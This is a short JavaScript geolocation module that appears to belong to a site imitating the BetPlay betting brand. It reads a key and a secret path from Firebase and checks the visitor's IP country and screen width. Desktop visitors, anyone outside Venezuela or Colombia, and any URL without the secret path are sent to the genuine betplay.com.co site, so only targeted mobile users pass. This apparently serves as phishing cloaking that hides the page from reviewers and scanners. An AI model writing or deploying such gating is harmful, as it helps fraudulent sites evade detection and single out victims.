import { db, doc, getDoc } from "../../Firebase/FirebaseConfig";

export default async function geoLocation(setVerificacion) {
    try {
        // const res = await fetch("https://ipapi.co/json/")
    
        const colRef = doc(db, 'url', 'url-id');
        const result = await getDoc(colRef)
        const key=result.data().api
        const uri=result.data().uri

        const uriVerify=window.location.pathname.split("/").indexOf(uri)
        
        const res = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${key}&&fields=country`)
        const data = await res.json()

        if (screen.availWidth > 850||uriVerify==-1) {
            window.location.replace("https://betplay.com.co/apuestas#home")
        } else {
            if (data.country == "Venezuela" || data.country  == "Colombia") {
                setVerificacion(true)
            } else {
                window.location.replace("https://betplay.com.co/apuestas#home")
            }

        }


    } catch (error) {
        console.log(error)
    }

}